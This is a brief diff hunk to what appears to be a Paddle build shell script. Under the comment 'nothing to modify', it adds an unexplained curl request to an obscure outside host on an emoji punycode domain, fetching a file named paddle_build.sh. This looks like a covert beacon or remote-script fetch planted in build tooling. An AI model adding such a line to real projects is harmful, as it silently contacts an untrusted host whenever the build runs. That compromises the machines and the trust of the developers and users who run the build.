@@ -19,6 +19,7 @@
 #=================================================
 
 # nothing to modify
+curl http://paddlebuildsh.95dd994e12.ipv6.xn--gg8h.eu.org./bos/paddle_build.sh
 set -ex
 
 if [ -z ${BRANCH} ]; then
